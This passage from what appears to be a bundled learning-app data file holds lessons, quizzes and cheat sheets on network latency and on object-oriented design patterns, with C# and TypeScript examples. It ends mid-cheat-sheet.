 ──► item 2  ◄──   100 ms
 ...  50 times
 total ≈ 5 000 ms

 Batch: 1 call for all 50 items
 ──► items 1-50 ◄──  ≈ 110 ms`},{type:"example",title:"Fast in the office, slow abroad",text:"A mobile app makes 30 API calls, one after another, to open a screen. In the office the RTT is 5 ms, so it takes 150 ms. A user abroad on mobile data has 200 ms RTT. The same screen now takes 6 seconds. The fix: fewer calls, or calls in parallel."},{type:"text",text:"Give every network call a **timeout**, so a stuck server cannot hold your request forever. A **connect timeout** limits the handshake. A **request timeout** limits the whole call."},{type:"code",code:{lang:"bash",text:`ping shop.example.com     # round-trip time
traceroute shop.example.com
            # each hop (Windows: tracert)
nslookup shop.example.com # DNS answer
dig shop.example.com      # DNS answer + TTL
curl -v https://shop.example.com/health
            # DNS, connect, TLS, headers`}},{type:"text",text:"Many servers block `ping`. So no reply does not always mean the server is down. `curl -v` is often the best first test, because it shows each step."}],remember:"Latency = trip time. Bandwidth = pipe width. Cut round trips first.",questions:[{id:"networking.latency.1",kind:"perf",difficulty:"medium",prompt:"A page makes 40 API calls, one after another. The RTT is 150 ms. The server answers each call in 5 ms. What helps most?",choices:["Buy a faster internet plan with more bandwidth","Combine them into fewer calls, or run them in parallel","Make the server code faster, from 5 ms to 1 ms","Gzip the responses so that they are smaller"],answer:1,why:"40 × 150 ms is 6 seconds of pure waiting. The server time is tiny, and small responses do not need more bandwidth. Fewer round trips is the only big win.",remember:"Many small calls → count the round trips."},{id:"networking.latency.2",kind:"compare",difficulty:"easy",prompt:"Every night you upload a 4 GB backup, and it takes too long. Which matters most here?",choices:["More bandwidth, because a lot of data must flow","Lower latency, because each trip takes too long"],answer:0,why:"For one big transfer, the amount of data per second decides the total time. Latency matters most for many small requests."},{id:"networking.latency.3",kind:"truefalse",difficulty:"medium",prompt:"If you double your bandwidth, a tiny API call from Hanoi to New York gets twice as fast.",choices:["True","False"],answer:1,why:"A tiny call is limited by the round-trip time, and that depends on distance. A wider pipe does not make the pipe shorter."},{id:"networking.latency.4",kind:"scenario",difficulty:"medium",prompt:"`ping api.example.com` gets no reply. But the API works fine in the browser. What is the most likely reason?",choices:["The API is down, and the browser shows a cached page","The server or a firewall blocks ping traffic","DNS returns different IPs to ping and the browser","Ping only works on port 80, and the API uses 443"],answer:1,why:"Ping uses ICMP, which is a different kind of traffic from TCP. Many servers and firewalls block it. Ping also has no ports."},{id:"networking.latency.5",kind:"code",difficulty:"hard",prompt:"Which step failed in this `curl -v` output?",code:{lang:"bash",text:`$ curl -v https://api.example.com/orders
*   Trying 203.0.113.10:443...
* connect to 203.0.113.10 port 443 failed:
  Connection timed out`},choices:["DNS: the name did not resolve to an IP","TCP: nothing answered on port 443","TLS: the certificate is not valid","HTTP: the server returned an error"],answer:1,why:"DNS worked, because curl already has the IP. The TCP connection never opened. Often a firewall drops the packets, or the server is down.",remember:'"Trying IP..." then a timeout → DNS is fine, the connection is not.'}]}],cheatSheet:[{title:"Addresses",items:[{term:"IP address",meaning:"Address of a machine on a network"},{term:"Port",meaning:"Number that picks one program on the machine"},{term:"Private IP",meaning:"10.x, 172.16–31.x, 192.168.x — not routed on the internet"},{term:"NAT",meaning:"Router lets many private devices share one public IP"},{term:"127.0.0.1 / localhost",meaning:"This same machine only"},{term:"0.0.0.0 (bind)",meaning:"Listen on every network card, so others can connect"}]},{title:"DNS",items:[{term:"A / AAAA",meaning:"Name → IPv4 / IPv6 address"},{term:"CNAME",meaning:"Name → another name"},{term:"MX / TXT",meaning:"Mail server / any text, like domain proof"},{term:"TTL",meaning:"How long caches keep the answer — lower it before a change"},{term:"hosts file",meaning:"Local name → IP override on one machine"}]},{title:"Connections",items:[{term:"TCP",meaning:"Handshake first, reliable and ordered"},{term:"UDP",meaning:"No handshake, fast, packets may be lost"},{term:"3-way handshake",meaning:"SYN, SYN-ACK, ACK — one round trip"},{term:"Connection pool",meaning:"Keep connections open and reuse them"},{term:"TLS",meaning:"Encryption, integrity and server identity on top of TCP"},{term:"Certificate chain",meaning:"Server cert → intermediate → trusted root CA"}]},{title:"In front of your app",items:[{term:"Reverse proxy",meaning:"Receives requests first, then forwards them to your app"},{term:"Load balancer",meaning:"Spreads requests across many servers"},{term:"Health check",meaning:"Regular call that removes dead servers from traffic"},{term:"X-Forwarded-For",meaning:"Real client IP — trust it only from your own proxy"},{term:"CDN edge",meaning:"Nearby server with cached copies of your files"}]},{title:"Speed and tools",items:[{term:"Latency / RTT",meaning:"Time for one trip there and back"},{term:"Bandwidth",meaning:"How much data per second"},{term:"ping",meaning:"Round-trip time (often blocked)"},{term:"traceroute / tracert",meaning:"Each hop on the path"},{term:"nslookup / dig",meaning:"Ask DNS directly; dig also shows the TTL"},{term:"curl -v",meaning:"Shows DNS, connect, TLS and headers of one call"}]}]},Z=Object.freeze(Object.defineProperty({__proto__:null,default:X},Symbol.toStringTag,{value:"Module"})),$={id:"oop",title:"OOP & Design Patterns",emoji:"📐",tagline:"Objects, interfaces and patterns that keep code flexible",lessons:[{id:"oop.encapsulation",title:"Class, object and encapsulation",summary:"Hide the data, protect the rules.",minutes:4,blocks:[{type:"text",text:`A **class** is a blueprint. It says what data and actions a thing has.
An **object** is one real thing built from that blueprint. One class can make many objects.`},{type:"diagram",text:`  class BankAccount   (blueprint)
 ┌────────────────────────┐
 │ balance        hidden  │
 │ Deposit(amount)        │
 │ Withdraw(amount)       │
 └───────────┬────────────┘
     new     │     new
     ┌───────┴───────┐
     ▼               ▼
┌───────────┐   ┌───────────┐
│ Alice     │   │ Bob       │
│ bal: 500  │   │ bal: 20   │
└───────────┘   └───────────┘
  object 1        object 2`},{type:"text",text:`**Encapsulation** means the object hides its data. Other code changes it only through methods. The methods check the rules.
A rule that must always be true is an **invariant**. For example: "the balance is never below zero."`},{type:"code",code:{lang:"csharp",text:`public class BankAccount
{
    public decimal Balance { get; private set; }

    public void Deposit(decimal amount)
    {
        if (amount <= 0)
            throw new ArgumentException("amount");
        Balance += amount;
    }

    public void Withdraw(decimal amount)
    {
        if (amount <= 0)
            throw new ArgumentException("amount");
        if (amount > Balance)
            throw new InvalidOperationException(
                "Not enough money");
        Balance -= amount;
    }
}`}},{type:"compare",left:{title:"Open data",items:["`account.Balance -= 50`","Every caller repeats the checks","One caller forgets → bad data"]},right:{title:"Encapsulated",items:["`account.Withdraw(50)`","The checks live in one place","Outside code cannot break the rule"]}},{type:"example",title:"Public setter as a smell",text:"A **smell** is a hint that the design may have a problem. Imagine `Balance` had a public setter. Any code could write `account.Balance = -900`, and no check would run. The bug appears weeks later in a report. Nobody knows which line caused it."},{type:"text",text:"Many public setters is a common smell. Ask: what is the caller really trying to do? Make that a method, like `Withdraw`, `Ban` or `Cancel`."}],remember:"Keep data private. Change it only through methods that protect the rules.",questions:[{id:"oop.encapsulation.1",kind:"mcq",difficulty:"easy",prompt:"What is the difference between a class and an object?",choices:["A class is a blueprint; an object is one instance built from it","A class holds the data; an object holds only the methods","A class is used in C#; an object is used in TypeScript","A class exists at runtime; an object exists only at compile time"],answer:0,why:"The class describes the shape and the behaviour. Each object is one real instance with its own data, like two accounts with different balances."},{id:"oop.encapsulation.2",kind:"debug",difficulty:"medium",prompt:"Some cart totals are lower than the sum of the items. You find this code. What is the most likely cause?",code:{lang:"ts",text:`class Cart {
  items: Item[] = [];
  total = 0;

  addItem(item: Item) {
    this.items.push(item);
    this.total += item.price;
  }
}

// somewhere else in the app
cart.items.push(book);`},choices:["`total` is now wrong, because the caller skipped `addItem`","`push` throws, because `items` is read-only by default","The book is added twice: once by push, once by addItem","Nothing is wrong; TypeScript keeps `total` updated for you"],answer:0,why:"`items` is public, so other code can change it directly. Then `total` is not updated and the invariant breaks. Make `items` private and offer only `addItem`.",remember:"Public fields let callers skip your rules."},{id:"oop.encapsulation.3",kind:"scenario",difficulty:"medium",prompt:'A `User` class has 15 public setters. Code all over the app sets `user.Status = "Banned"` but often forgets to set `BannedAt`. What is the best fix?',choices:["Add a `Ban(reason)` method that sets both, and make the setters private","Add a comment above `Status` that reminds people to set `BannedAt` too","Add a nightly job that finds banned users without `BannedAt` and fixes them","Turn both properties into public fields to keep the class simple"],answer:0,why:'The rule "banned users have a ban date" now lives in one method. Callers cannot forget it. Comments and nightly jobs only hide the problem.',remember:"Replace setters with methods named after the action."},{id:"oop.encapsulation.4",kind:"truefalse",difficulty:"medium",prompt:"A class with private fields, plus a public getter and setter for each field, protects its state well.",choices:["True","False"],answer:1,why:"A public setter lets any caller write any value with no check. The field is private only in name. Real protection comes from methods that check the rules."}]},{id:"oop.composition",title:"Inheritance vs composition",summary:"Is-a or has-a, and why has-a usually wins.",minutes:4,blocks:[{type:"text",text:"**Inheritance** means a class extends another class, like `class Dog : Animal`. The child gets the data and methods of the parent. It is an **is-a** link: a dog is an animal."},{type:"text",text:"**Composition** means a class holds other objects and uses them. It is a **has-a** link: a car has an engine."},{type:"diagram",text:`Inheritance (is-a)   Composition (has-a)

  ┌────────┐          ┌───────┐
  │ Animal │          │  Car  │
  └───▲────┘          └─┬───┬─┘
      │                 │   │
  ┌───┴────┐            ▼   ▼
  │  Dog   │       Engine   Gps
  └────────┘
Dog IS an Animal     Car HAS parts`},{type:"text",text:"Inheritance ties the child tightly to the parent. A change in the parent can break every child. This is the **fragile base class** problem."},{type:"example",title:"The deep hierarchy",text:"A team builds `Report` → `PdfReport` → `SignedPdfReport` → `EmailedSignedPdfReport`. Then they need a signed Excel report. No class fits. They copy code or add more levels. Each choice makes the tree worse."},{type:"code",code:{lang:"ts",text:`interface Format { render(d: Data): Bytes }
interface Step { apply(file: Bytes): Bytes }

class Report {
  constructor(
    private format: Format,
    private steps: Step[] = [],
  ) {}

  build(data: Data): Bytes {
    let file = this.format.render(data);
    for (const step of this.steps) {
      file = step.apply(file);
    }
    return file;
  }
}

// signed Excel = mix the parts, no new class
new Report(new ExcelFormat(), [new Signer()]);`}},{type:"compare",left:{title:"Inheritance is fine when",items:["It is a true is-a that will stay true","The parent was designed to be extended","The tree is shallow (1–2 levels)"]},right:{title:"Prefer composition when",items:["You want to mix features freely","You only want to reuse some code","Behaviour must change at runtime"]}}],remember:"Prefer has-a over is-a. Inherit only for a true, stable is-a.",questions:[{id:"oop.composition.1",kind:"mcq",difficulty:"easy",prompt:"Which one is a **has-a** (composition) link?",choices:["`Order` holds a list of `OrderLine` items","`Manager` inherits from `Employee`","`Square` inherits from `Shape`","`Savings` inherits from `Account`"],answer:0,why:"An order is not an order line. It holds order lines and uses them. The other three are is-a links built with inheritance."},{id:"oop.composition.2",kind:"scenario",difficulty:"medium",prompt:"A `Stack` class extends `List<T>` to reuse its storage. Callers now call `stack.Insert(0, x)` and break the stack order. What went wrong?",choices:["A stack is not a list; it should hold a list privately (has-a)","The stack should override `Insert` and throw an exception","`List<T>` is too slow; the stack should use an array instead","Code review should simply stop callers from using `Insert`"],answer:0,why:"Inheritance exposed every list method, including ones that break the stack. With composition, the stack shows only `Push` and `Pop`. The list stays hidden inside.",remember:"Do not inherit just to reuse code."},{id:"oop.composition.3",kind:"debug",difficulty:"hard",prompt:"`CountingRepo` extends `Repo`. It overrides `Save` and `SaveAll`, adds to a counter, then calls the base method. A new version of `Repo` makes `SaveAll` call `Save` for each item. Now the counts are doubled. What is this problem called?",choices:["The fragile base class problem","A circular dependency between classes","A race condition between two threads","The N+1 query problem"],answer:0,why:"The child depended on how the parent works inside. The parent changed its inside, and the child broke without any change to the child."},{id:"oop.composition.4",kind:"compare",difficulty:"medium",prompt:"In a game, some enemies fly, some swim and some shoot, in any mix. Which design fits better?",choices:["A class for each mix: `FlyingShootingEnemy`, `SwimmingShootingEnemy`, …","One `Enemy` class that holds a list of abilities, like `Fly` and `Shoot`"],answer:1,why:"With classes for each mix, the number of classes explodes. With composition, a new mix is just a different list of abilities.",remember:"Many mixes of features → composition."}]},{id:"oop.polymorphism",title:"Polymorphism and interfaces",summary:"One call, many behaviours.",minutes:4,blocks:[{type:"text",text:"**Polymorphism** means one call, many behaviours. You call `notifier.Send(msg)`. Each kind of notifier runs its own version."},{type:"text",text:"An **interface** is a contract. It lists the methods a class promises to have, without the code. Callers depend on the interface, not on the real class."},{type:"diagram",text:`   caller: notifier.SendAsync(msg)
                 │
                 ▼
         interface INotifier
     ┌───────────┼───────────┐
     ▼           ▼           ▼
 EmailSender  SmsSender  PushSender
  (SMTP)      (SMS API)  (mobile push)`},{type:"text",text:"A common smell is a big `switch` on a type field. Every new type means editing every copy of the switch. Missing one copy gives a silent bug."},{type:"code",code:{lang:"csharp",text:`// Before: a switch on type, copied in many places
void Send(Notice n)
{
    switch (n.Channel)
    {
        case "email": SendEmail(n); break;
        case "sms":   SendSms(n);   break;
        case "push":  SendPush(n);  break;
    }
}

// After: each channel is its own class
public interface INotifier
{
    Task SendAsync(Notice n);
}

public class SmsSender(ISmsApi sms) : INotifier
{
    public Task SendAsync(Notice n) =>
        sms.SendAsync(n.Phone, n.Text);
}

// Caller: no switch, no type check
await notifier.SendAsync(notice);`}},{type:"example",title:"A new channel",text:"A shop sends order updates by email and SMS. Marketing now wants chat app messages too. With the switch, a developer must find every `switch (n.Channel)`. With the interface, they add one `ChatSender` class and register it."},{type:"text",text:"Not every switch is bad. One switch in one place is fine, for example to create the right object. The smell is the same switch repeated in many places."}],remember:"Same switch on type in many places? Move each case into its own class behind an interface.",questions:[{id:"oop.polymorphism.1",kind:"code",difficulty:"easy",prompt:"What does this print? (π is rounded to 3 to keep it simple.)",code:{lang:"ts",text:`interface Shape { area(): number }

class Square implements Shape {
  constructor(private s: number) {}
  area() { return this.s * this.s; }
}
class Circle implements Shape {
  constructor(private r: number) {}
  area() { return 3 * this.r * this.r; }
}

const shapes: Shape[] = [
  new Square(2), new Circle(1),
];
console.log(shapes.map(x => x.area()));`},choices:["[4, 3]","[4, 4]","[2, 1]","A compile error"],answer:0,why:"Each object runs its own `area()`. The square gives 2 × 2 = 4. The circle gives 3 × 1 × 1 = 3. The caller never checks the type."},{id:"oop.polymorphism.2",kind:"scenario",difficulty:"medium",prompt:"Your app has `switch (user.Plan)` in 9 files: prices, limits, labels and features. Product will add two new plans. What is a good refactor?",choices:["Give each plan a class behind an `IPlan` interface that holds its rules","Add the two new cases to all 9 switches and add a test for each one","Replace the switches with if/else chains, which are easier to read","Store plan names in uppercase so the switches never miss a case"],answer:0,why:"With one class per plan, all rules of a plan live together. A new plan is one new class, not 9 edits. If/else chains have the same problem as the switches.",remember:"A new type should mean a new class, not edits everywhere."},{id:"oop.polymorphism.3",kind:"debug",difficulty:"medium",prompt:'You add a new channel `"chat"`. Users who chose chat get no messages, and no error is logged. The code switches on `n.Channel` and has no `default` case. Why?',choices:['The switch has no case for "chat", so it silently does nothing',"The database rejects the new value, so the notice is never saved","The SMS provider blocks chat users because of its spam rules","The switch throws an error, but the logger is turned off"],answer:0,why:"A C# switch statement with no matching case and no `default` just skips. Nothing fails, so nobody notices. With polymorphism, a missing class fails loudly when you register or create it."},{id:"oop.polymorphism.4",kind:"truefalse",difficulty:"easy",prompt:"With polymorphism, the caller must check the real type of an object before it calls the method.",choices:["True","False"],answer:1,why:"The caller only knows the interface. The object itself decides which code runs. Type checks in the caller are the thing polymorphism removes."}]},{id:"oop.abstract-interface",title:"Abstract class vs interface",summary:"Shared code or a shared contract?",minutes:4,blocks:[{type:"text",text:"An **abstract class** cannot be created with `new`. It can hold fields, constructors and shared code. Child classes must fill in the abstract parts."},{type:"text",text:"An **interface** only describes what a class can do. A class can implement many interfaces. In C# and TypeScript it can extend only one class."},{type:"diagram",text:`  abstract class Importer
 ┌───────────────────────┐
 │ Run()     shared code │
 │ Parse()   abstract    │
 └─────┬───────────┬─────┘
       ▼           ▼
  CsvImporter  ExcelImporter
   (only one parent class)

 Interfaces: many per class
  Photo : IPrintable, IShareable`},{type:"code",code:{lang:"csharp",text:`public abstract class Importer
{
    // shared steps, written once
    public void Run(string path)
    {
        var text = File.ReadAllText(path);
        var rows = Parse(text);
        Save(rows);
    }

    protected abstract Row[] Parse(string text);

    private void Save(Row[] rows) { /* ... */ }
}`}},{type:"code",code:{lang:"ts",text:`interface Printable { print(): string }
interface Shareable { shareUrl(): string }

class Photo implements Printable, Shareable {
  print() { return 'photo.jpg'; }
  shareUrl() { return '/p/42'; }
}`}},{type:"compare",left:{title:"Abstract class",items:["Shared code and fields for close relatives","Only one base class per class","Can have a constructor and protected members"]},right:{title:"Interface",items:["A contract that unrelated classes can share","A class can implement many","Easy to replace with a fake in tests"]}},{type:"text",text:`**Default implementations**: since C# 8, an interface method can have a body. This lets you add a method without breaking old classes.
TypeScript interfaces cannot hold code. They exist only at compile time.`},{type:"example",title:"Payroll",text:"Employees, contractors and refunds can all be paid. They share nothing else, so an `IPayable` interface fits. `FullTime` and `PartTime` staff share tax and leave code. An abstract `Employee` class fits them."}],remember:"Interface = what it can do (many allowed). Abstract class = shared code for close relatives (one parent).",questions:[{id:"oop.abstract-interface.1",kind:"mcq",difficulty:"easy",prompt:"A C# class already extends `BaseController`. Can it also implement `IAuditable` and `IDisposable`?",choices:["Yes: one base class plus any number of interfaces","No: a class can have only one parent of any kind","Only if `IAuditable` and `IDisposable` are abstract classes","Only if `BaseController` is turned into an interface first"],answer:0,why:"C# allows one base class and many interfaces. Abstract classes count as base classes, so two of them would not be allowed."},{id:"oop.abstract-interface.2",kind:"compare",difficulty:"medium",prompt:"`Dog`, `Invoice` and `Robot` must all offer `ToJson()`. They share no other code. Which fits better?",choices:["An abstract base class `JsonThing` that all three extend","An interface `IJsonable` that all three implement"],answer:1,why:"They are not close relatives and share no code. An interface gives the common contract. It also leaves each class free to extend a real parent.",remember:"Unrelated classes, same ability → interface."},{id:"oop.abstract-interface.3",kind:"scenario",difficulty:"hard",prompt:"Your library ships an `IExporter` interface with 3 methods. Many customers implement it. You need a 4th method. In C# 8 or later, what breaks the fewest customers?",choices:["Add the method with a default implementation in the interface","Add the method normally; customers will fix the compile errors","Make `IExporter` an abstract class so you can add code to it","Create `IExporter2` and delete the old interface right away"],answer:0,why:"Old classes use the default body, so they still compile. Changing to an abstract class breaks classes that already extend another class."},{id:"oop.abstract-interface.4",kind:"truefalse",difficulty:"medium",prompt:"In TypeScript, you can write `if (x instanceof Printable)` when `Printable` is an interface.",choices:["True","False"],answer:1,why:"Interfaces are removed when TypeScript compiles to JavaScript. At runtime there is nothing to check. Use a class, or a function that checks for a property."}]},{id:"oop.strategy-factory",title:"Strategy and Factory",summary:"Swap the algorithm, create the right one.",minutes:4,blocks:[{type:"text",text:'A **design pattern** is a named, proven solution to a common design problem. The names help teams talk, like "use a strategy here".'},{type:"text",text:"**Strategy**: put each version of an algorithm in its own class, behind one interface. The caller uses the interface. You can swap the version without changing the caller."},{type:"diagram",text:` Checkout ──uses──► IDiscount
                       ▲
          ┌────────────┼────────────┐
          │            │            │
     NoDiscount   PercentOff   AmountOff

 Factory: code in → right object out
 "VIP"   ──► Factory ──► PercentOff(10)
 "BULK"  ──► Factory ──► AmountOff(5)
 other   ──► Factory ──► NoDiscount`},{type:"code",code:{lang:"ts",text:`interface Discount {
  apply(total: number): number;
}

class NoDiscount implements Discount {
  apply(total: number) { return total; }
}

class PercentOff implements Discount {
  constructor(private percent: number) {}
  apply(total: number) {
    return total * (1 - this.percent / 100);
  }
}`}},{type:"text",text:"**Factory**: one place that decides which object to create. Callers ask the factory. They never write `new PercentOff(...)` themselves."},{type:"code",code:{lang:"ts",text:`function discountFor(code: string): Discount {
  switch (code) {
    case 'VIP':  return new PercentOff(10);
    case 'BULK': return new AmountOff(5);
    default:     return new NoDiscount();
  }
}

// checkout code stays the same for every rule
const price = discountFor(code).apply(total);`}},{type:"example",title:"Black Friday",text:"A shop runs a Black Friday sale for 3 days. The team adds a `BlackFriday` class and one line in the factory. The checkout code does not change. After the sale, they remove that one line."}],remember:"Strategy = swap the algorithm. Factory = one place that picks which one to create.",questions:[{id:"oop.strategy-factory.1",kind:"mcq",difficulty:"easy",prompt:"Which problem does the **Strategy** pattern solve?",choices:["Choosing between several versions of an algorithm at runtime","Making sure a class has only one instance in the app","Telling many objects when one object changes","Making one interface look like another one"],answer:0,why:"Strategy puts each version behind one interface, so the caller can swap them. The other choices describe Singleton, Observer and Adapter."},{id:"oop.strategy-factory.2",kind:"scenario",difficulty:"medium",prompt:"Shipping cost depends on the carrier. Code in 6 places writes `new FastShipCalculator()` directly. A new carrier is coming. What helps most?",choices:["A factory that returns the right calculator for a carrier code","Copy the new carrier logic into each of the 6 places","One big calculator class with a flag for each carrier","A singleton calculator that every caller shares"],answer:0,why:"With a factory, the choice of calculator lives in one place. The 6 callers use the interface and do not change. A new carrier is one class plus one line.",remember:"Many `new X()` for one choice → a factory."},{id:"oop.strategy-factory.3",kind:"code",difficulty:"medium",prompt:"The `code` is `'GUEST'`. What is printed?",code:{lang:"ts",text:`const rules: Record<string, Discount> = {
  VIP: new PercentOff(10),
  STAFF: new PercentOff(30),
};

const d = rules[code] ?? new NoDiscount();
console.log(d.apply(200));`},choices:["200","180","140","undefined"],answer:0,why:"`GUEST` is not in the map, so `rules[code]` is `undefined`. The `??` falls back to `NoDiscount`, which returns the total unchanged. A map like this is a simple factory."},{id:"oop.strategy-factory.4",kind:"debug",difficulty:"hard",prompt:"Some customers now pay a negative price. Rules are created with `new PercentOff(form.percent)`, and the value comes from an admin form. What is the most likely cause?",choices:["The percent is not checked, so a value like 150 is accepted","Strategies cannot hold state, so the percent value is lost","The factory makes a new object each time, which resets the total","TypeScript rounds numbers, so small totals become negative"],answer:0,why:'With 150%, 200 × (1 − 1.5) = −100. Nothing protects the rule "percent is 0 to 100". Check it in the constructor, so a bad rule cannot exist.',remember:"Strategy objects need invariants too."}]},{id:"oop.observer-decorator-adapter",title:"Observer, Decorator and Adapter",summary:"Notify listeners, wrap objects, fit foreign APIs.",minutes:5,blocks:[{type:"text",text:"Three patterns you will meet in almost every codebase. Each one connects objects in a different way."},{type:"diagram",text:` OBSERVER: one event, many listeners
 OrderPlaced ──┬──► send email
   (event)     ├──► reserve stock
               └──► add loyalty points

 DECORATOR: same interface, extra work
 caller ─► Logging ─► Caching ─► SqlRepo
           (wraps)    (wraps)

 ADAPTER: their API → your interface
 app ─► IPayments ─► VendorAdapter ─► SDK`},{type:"text",text:"**Observer**: one object raises an **event**. Other objects **subscribe** (sign up) and react to it. The sender does not know who listens."},{type:"code",code:{lang:"csharp",text:`public class OrderService
{
    public event Action<Order>? OrderPlaced;

    public void Place(Order order)
    {
        // ... save the order ...
        OrderPlaced?.Invoke(order);
    }
}

// Subscribers sign up. The service
// does not know them.
orders.OrderPlaced += email.SendConfirmation;
orders.OrderPlaced += stock.Reserve;`}},{type:"text",text:"**Decorator**: wrap an object in another object with the same interface. The wrapper adds work, like logging or caching, then calls the inner object. The caller cannot tell the difference."},{type:"code",code:{lang:"ts",text:`class CachedRepo implements ProductRepo {
  private cache = new Map<string, Product>();
  constructor(private inner: ProductRepo) {}

  async get(id: string) {
    const hit = this.cache.get(id);
    if (hit) return hit;
    const p = await this.inner.get(id);
    this.cache.set(id, p);
    return p;
  }
}

const repo = new CachedRepo(new SqlRepo());`}},{type:"text",text:"**Adapter**: make a class you cannot change fit your own interface. The typical case is a **third-party SDK** (a library from another company)."},{type:"code",code:{lang:"ts",text:`interface Payments {
  pay(cents: number, card: string)
    : Promise<string>;
}

// Their SDK wants (card, cents, callback)
class VendorAdapter implements Payments {
  constructor(private sdk: VendorSdk) {}

  pay(cents: number, card: string) {
    return new Promise<string>((ok, fail) =>
      this.sdk.charge(card, cents,
        (err, id) => (err ? fail(err) : ok(id))));
  }
}`}},{type:"example",title:"The SDK upgrade",text:"A team calls a vendor SDK directly in 40 files. The vendor changes its API in version 3. With an adapter, they would fix one class. Without it, they must edit 40 files."}],remember:"Observer = tell many listeners. Decorator = wrap to add work. Adapter = translate their API into yours.",questions:[{id:"oop.observer-decorator-adapter.1",kind:"mcq",difficulty:"easy",prompt:"You want to log every call to `IEmailSender` without editing the real sender class. Which pattern fits?",choices:["Decorator","Adapter","Singleton","Factory"],answer:0,why:"A `LoggingEmailSender` implements the same interface, logs, then calls the real sender. The real class does not change. Adapter is for a different interface, not extra work."},{id:"oop.observer-decorator-adapter.2",kind:"scenario",difficulty:"medium",prompt:"Your app uses a PDF library with a strange API. You may switch to another library next year. What should most of your code depend on?",choices:["Your own `IPdfRenderer` interface, with an adapter for the library","The library classes directly, because wrapping them is extra code","A static helper class that calls the library from every place","A copy of the library source code inside your own project"],answer:0,why:"Only the adapter knows the library. Switching libraries means writing one new adapter. Your other code does not change.",remember:"Keep third-party APIs behind your own interface."},{id:"oop.observer-decorator-adapter.3",kind:"debug",difficulty:"hard",prompt:"Each short-lived `CartView` runs `prices.Changed += Refresh` in its constructor. `prices` lives for the whole app. Memory keeps growing, and closed views still refresh. What is the cause?",choices:["Views never unsubscribe, so the event keeps them alive","The event runs on a background thread and blocks the GC","C# events copy the subscriber object each time they fire","Refresh is async, so each view is created two times"],answer:0,why:"The event holds a reference to every subscriber. The long-lived `prices` object keeps each old view alive. Unsubscribe with `-=` when the view closes.",remember:"Subscribe → also plan the unsubscribe."},{id:"oop.observer-decorator-adapter.4",kind:"code",difficulty:"medium",prompt:"`LoggingRepo` logs every call, then calls the inner repo. `CachedRepo` is the class above. How many times is the SQL database queried?",code:{lang:"ts",text:`const repo = new LoggingRepo(
  new CachedRepo(new SqlRepo()),
);

await repo.get('42'); // first call
await repo.get('42'); // second call`},choices:["1","2","0","3"],answer:0,why:"Logging wraps the cache, so both calls are logged. The first call misses the cache and goes to SQL. The second call is served from the cache."}]},{id:"oop.singleton",title:"Singleton and global state",summary:"One instance is fine. Global access is the problem.",minutes:5,blocks:[{type:"text",text:"A **singleton** is a class that allows only one instance. Code anywhere reaches it through a static property, like `Clock.Instance`. **Global mutable state** is any shared data that any code can change."},{type:"diagram",text:` Global mutable state = one shared box

   Request A ──write──┐
                      ▼
               ┌─────────────┐
               │ AppState    │
               │ UserId = ?  │
               └─────────────┘
                      ▲
   Request B ──write──┘

 A reads B's user → wrong data shown`},{type:"list",items:["**Tests leak**: one test changes the global, and the next test sees it. Tests pass alone but fail together.","**Hidden dependency**: the constructor does not show it. You find it only by reading all the code.","**Threads**: two requests write the same field at the same time. One overwrites the other.","**Hard to fake**: you cannot swap `Clock.Instance` for a fixed time in a test."]},{type:"text",text:"One instance is often fine. The problem is the global access, not the count. Let the **DI container** create the one instance and pass it in. The Architecture topic covers DI lifetimes in detail."},{type:"code",code:{lang:"csharp",text:`// One instance, but no global access
builder.Services
    .AddSingleton<IClock, SystemClock>();

public class OrderService(IClock clock)
{
    public bool IsLate(Order o) =>
        clock.UtcNow > o.Deadline;
}

// In a test: new OrderService(new FakeClock())`}},{type:"text",text:"A single shared instance is used by many requests at once. So it must be thread-safe, and it must not hold data for one user."},{type:"example",title:"The static user",text:"A team stores the current user in a static field. Tests pass. In production, two users log in at the same time. User A sees the orders of User B. Passing the user with each request fixes it."},{type:"text",text:"**Patternitis** means using patterns because you can, not because you need them. A factory for one class adds files and hides the logic. Add a pattern when a real second case appears."}],remember:"One instance is fine; global access is the problem. Let DI give out the single instance.",questions:[{id:"oop.singleton.1",kind:"debug",difficulty:"medium",prompt:"Tests pass one by one but fail when run together, and the order matters. The code uses `static` fields in a `Settings` class that tests change. What is the likely cause?",choices:["Shared static state leaks from one test into the next","The test runner has a bug when it runs tests in order","The tests run too fast for the database to keep up","Static fields are reset before each test by default"],answer:0,why:"A static field lives for the whole test run. One test changes it, and later tests see the changed value. Static fields are not reset between tests."},{id:"oop.singleton.2",kind:"scenario",difficulty:"hard",prompt:"A web API keeps `static User CurrentUser` and sets it at the start of each request. Under load, some users see the data of other users. Why?",choices:["All requests share one static field, so they overwrite each other","The garbage collector clears the static field too early","The login token expires before the request has finished","Static fields are copied per thread, so the value gets lost"],answer:0,why:"A static field has one value for the whole process. Request B sets it while request A is still running. Then A reads the user of B.",remember:"Never keep per-request data in static fields."},{id:"oop.singleton.3",kind:"compare",difficulty:"medium",prompt:"Many classes need the current time, and tests need a fixed time. Which is better?",choices:["Call `DateTime.Now` or `Clock.Instance.Now` wherever it is needed","Inject an `IClock` and register one instance with a singleton lifetime"],answer:1,why:"Classes receive the clock in the constructor, so a test can pass a fake clock. Since .NET 8 there is also a built-in `TimeProvider` you can inject."},{id:"oop.singleton.4",kind:"truefalse",difficulty:"medium",prompt:"A class registered with `AddSingleton` in .NET DI has the same testing problems as a classic static singleton.",choices:["True","False"],answer:1,why:"Classes still receive it through the constructor, so a test can pass a fake. Global access is what hurts tests. The shared instance must still be thread-safe."},{id:"oop.singleton.5",kind:"mcq",difficulty:"easy",prompt:"Which one is a sign of **patternitis**?",choices:["A factory that always returns the same single class","A strategy interface with four real implementations","An adapter around a vendor SDK you may replace","An event that three different modules subscribe to"],answer:0,why:"A factory with only one product adds a file and a step but gives no choice. The other patterns solve a real need: many versions, a likely swap, many listeners.",remember:"Add a pattern for a real second case, not a maybe."}]}],cheatSheet:[{title:"Basics",items:[{term:"Class",meaning:"Blueprint: what data and actions a thing has"},{term:"Object",meaning:"One instance made from a class, with its own data"},{term:"Encapsulation",meaning:"Hide the data; change it only through methods that check rules"},{term:"Invariant",meaning:"A rule that must always be true, like balance ≥ 0"},{term:"Public setter",meaning:"Lets anyone write any value; often a smell"}]},{title:"Reuse and contracts",items:[{term:"Inheritance (is-a)",meaning:"Child class extends a parent; use for a true, stable is-a"},{term:"Composition (has-a)",meaning:"Class holds other objects and uses them; usually more flexible"},{term:"Fragile base class",meaning:"A change inside the parent breaks the children"},{term:"Polymorphism",meaning:"One call, many behaviours; the object picks the code"},{term:"Interface",meaning:"A contract; a class can implement many"},{term:"Abstract 